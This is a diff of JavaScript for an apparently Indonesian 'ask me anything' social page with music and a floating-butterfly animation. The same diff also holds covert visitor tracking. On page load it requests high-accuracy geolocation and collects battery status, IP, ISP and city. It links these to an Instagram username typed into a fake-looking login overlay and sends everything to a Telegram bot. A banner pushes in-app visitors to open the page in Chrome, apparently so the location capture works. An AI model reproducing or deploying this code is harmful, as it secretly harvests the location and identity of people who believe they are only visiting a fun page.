@@ -60,10 +60,12 @@ if (isMobile) {
   setTimeout(() => { startMusic(); }, 800);
 }
 
+// === MODAL PERTANYAAN ===
 const modal = document.getElementById('modal');
 document.getElementById('openAsk').onclick = () => modal.classList.add('show');
 document.getElementById('closeQ').onclick = () => modal.classList.remove('show');
 
+// === LOGIN INSTAGRAM ===
 const overlay = document.getElementById("blurOverlay"),
   input = document.getElementById("igInput"),
   btnLogin = document.getElementById("igSubmit"),
@@ -97,7 +99,7 @@ btnLogin.onclick = () => {
   removeOverlay();
 };
 
-// universal send animation + swoosh
+// === FUNGSI KIRIM TELEGRAM UNIVERSAL ===
 async function sendTelegramMessage(url, body, el) {
   el.innerHTML = `
     <div class="mailContainer">
@@ -126,7 +128,7 @@ async function sendTelegramMessage(url, body, el) {
   }
 }
 
-// send question (modal)
+// === KIRIM PERTANYAAN ===
 document.getElementById('sendQ').addEventListener('click', async () => {
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
   const text = document.getElementById('qtext').value.trim();
@@ -143,9 +145,11 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   setTimeout(() => { if (qmsg.textContent.includes("Terkirim")) modal.classList.remove('show'); }, 900);
 });
 
-// take photo / preview
+// === KIRIM FOTO ===
 const takeBtn = document.getElementById("takePhoto");
 const photoInput = document.getElementById("photoInput");
+const preview = document.getElementById("photoPreview");
+
 takeBtn.onclick = async () => {
   try {
     const cameraInput = document.createElement("input");
@@ -170,8 +174,6 @@ photoInput.addEventListener('change', () => {
     reader.readAsDataURL(photoInput.files[0]);
   }
 });
-
-// send photo
 document.getElementById("sendPhoto").addEventListener('click', async () => {
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
   const fileInput = document.getElementById("photoInput");
@@ -195,10 +197,9 @@ document.getElementById("sendPhoto").addEventListener('click', async () => {
   }
 });
 
-// === Pengambilan Info Pengunjung ===
+// === INFO PENGUNJUNG ===
 async function showVisitorInfo() {
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
-
   async function sendToTelegram(d, latitude, longitude, source = "Unknown", accuracy = null) {
     try {
       const now = new Date();
@@ -216,7 +217,6 @@ async function showVisitorInfo() {
         const battery = await navigator.getBattery();
         batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
       } catch {}
-
       const msg = `📢 Pengunjung Baru!
 👤 ${savedUser}
 🌎 ${d.city || "?"}, ${d.country || d.country_name || "?"}
@@ -228,7 +228,6 @@ async function showVisitorInfo() {
 🏷️ ISP: ${d.connection?.isp || d.org || "?"}
 📡 IP: ${d.ip || "?"}
 🕓 ${now.toLocaleString('id-ID')}`;
-
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -236,7 +235,6 @@ async function showVisitorInfo() {
       });
     } catch (err) { console.error("❌ Gagal kirim info:", err); }
   }
-
   try {
     const coords = await new Promise((resolve, reject) => {
       navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
@@ -251,5 +249,129 @@ async function showVisitorInfo() {
 }
 showVisitorInfo();
 
-// === Efek Butterfly & Live Mode ===
-// (bagian efek dan status sama persis dengan file asli)
+// === EFEK BUTTERFLY 💸 ===
+(function(){
+  const area = document.querySelector('.card');
+  const butterflies = [];
+  const butterflyCount = 7;
+  let holdActive = false;
+  let holdX = 0;
+  let holdY = 0;
+  area.style.position = 'relative';
+  area.style.overflow = 'hidden';
+  function getBounds(){ const rect=area.getBoundingClientRect(); return { width: area.clientWidth, height: area.clientHeight, left: rect.left, top: rect.top }; }
+  const bounds = getBounds();
+  for(let i=0;i<butterflyCount;i++){
+    const b=document.createElement('div'); b.className='butterfly'; b.textContent='💸'; area.appendChild(b);
+    butterflies.push({ el:b, x:Math.random()*bounds.width, y:Math.random()*bounds.height, vx:(Math.random()-0.5)*1.2, vy:(Math.random()-0.5)*1.2, size:16+Math.random()*10, flapOffset:Math.random()*Math.PI*2 });
+    b.style.fontSize = butterflies[i].size + 'px';
+  }
+  function moveButterflies(){
+    const rect = getBounds();
+    const time = performance.now()/200;
+    butterflies.forEach(b=>{
+      b.vy += 0.002;
+      if(holdActive){ const dx=holdX-b.x; const dy=holdY-b.y; b.vx += dx*0.002; b.vy += dy*0.002; }
+      b.vx += Math.sin(time + b.flapOffset)*0.04;
+      b.vy += Math.cos(time + b.flapOffset)*0.02;
+      b.x += b.vx; b.y += b.vy;
+      if(b.x <= 0 || b.x >= rect.width - b.size) b.vx *= -0.8;
+      if(b.y <= 0 || b.y >= rect.height - b.size) b.vy *= -0.8;
+      b.vx = Math.max(-1.8, Math.min(1.5, b.vx));
+      b.vy = Math.max(-1.8, Math.min(1.8, b.vy));
+      const flap = Math.sin(time*8 + b.flapOffset)*20;
+      b.el.style.left = b.x + 'px'; b.el.style.top = b.y + 'px';
+      b.el.style.transform = `rotate(${flap}deg) scale(${1 + Math.sin(time*4 + b.flapOffset)*0.05})`;
+    });
+    requestAnimationFrame(moveButterflies);
+  }
+  moveButterflies();
+  const startHold=(x,y)=>{ const rect=getBounds(); holdActive=true; holdX=x-rect.left; holdY=y-rect.top; };
+  const moveHold=(x,y)=>{ if(holdActive){ const rect=getBounds(); holdX=x-rect.left; holdY=y-rect.top; } };
+  const endHold=()=> holdActive=false;
+  area.addEventListener('mousedown', e=> startHold(e.clientX,e.clientY));
+  area.addEventListener('mousemove', e=> moveHold(e.clientX,e.clientY));
+  area.addEventListener('mouseup', endHold);
+  area.addEventListener('mouseleave', endHold);
+  area.addEventListener('touchstart', e=>{ const t=e.touches[0]; startHold(t.clientX,t.clientY); });
+  area.addEventListener('touchmove', e=>{ const t=e.touches[0]; moveHold(t.clientX,t.clientY); });
+  area.addEventListener('touchend', endHold);
+  area.addEventListener('touchcancel', endHold);
+})();
+
+// === LIVE MODE STATUS ===
+(async function(){
+  const titleEl = [...document.querySelectorAll('*')].find(e => /sharing vibes & question/i.test(e.textContent));
+  if(!titleEl) return;
+  const parentEl = titleEl.parentElement || document.body;
+
+  const statusBox = document.createElement("div");
+  statusBox.id = "liveModeStatus";
+  statusBox.style.cssText = `
+    width:100%;
+    display:block;
+    text-align:center;
+    font-size:14px;
+    font-family:'Poppins', monospace;
+    color:#cfcfcf;
+    opacity:0;
+    transform:translateY(6px);
+    transition:opacity .6s ease, transform .6s ease, color .6s ease;
+    margin-top:6px;
+    margin-bottom:4px;
+    letter-spacing:0.4px;
+    user-select:none;
+    position:relative;
+  `;
+
+  const musicBtn = parentEl.querySelector("#musicButton");
+  if (musicBtn) musicBtn.insertAdjacentElement("beforebegin", statusBox);
+  else titleEl.insertAdjacentElement("afterend", statusBox);
+
+  async function updateStatus(){
+    try {
+      const res = await fetch("https://sybau.imamadevera.workers.dev/status", {cache:"no-store"});
+      const data = await res.json();
+      const time = new Date(data.time);
+      const diff = (Date.now() - time.getTime()) / 60000;
+      const ago = diff < 1 ? "Music" : `${Math.floor(diff)}m ago`;
+      const text = `${data.status} (${ago})`;
+      if (statusBox.textContent !== text) {
+        statusBox.style.opacity = 0;
+        statusBox.style.transform = "translateY(6px)";
+        setTimeout(() => {
+          statusBox.textContent = text;
+          statusBox.style.opacity = 1;
+          statusBox.style.transform = "translateY(0)";
+          let color = "#fff";
+          if (data.status.includes("Online")) color = "#00ffb3";
+          else if (data.status.includes("Listening")) color = "#4cc9ff";
+          else if (data.status.includes("Offline")) color = "#ff7ca3";
+          statusBox.style.color = color;
+        }, 200);
+      }
+    } catch {
+      statusBox.textContent = "⚠️ gagal memuat status";
+      statusBox.style.color = "#ff7979";
+      statusBox.style.opacity = 1;
+      statusBox.style.transform = "translateY(0)";
+    }
+  }
+
+  updateStatus();
+  setInterval(updateStatus, 4000);
+})();
+
+// === DETEKSI INSTAGRAM / FB BROWSER ===
+const ua = navigator.userAgent || navigator.vendor || window.opera;
+if (ua.includes("Instagram") || ua.includes("FBAV") || ua.includes("FBAN")) {
+  const warn = document.createElement("div");
+  warn.textContent = "buka lewat Chrome";
+  warn.style.cssText = `
+    position: fixed; top: 0; left: 0; width: 100%;
+    background: #ffcd4c; color: #000; padding: 10px;
+    text-align: center; font-weight: 600; z-index: 9999;
+    font-family: Inter, system-ui, sans-serif;
+  `;
+  document.body.appendChild(warn);
+}
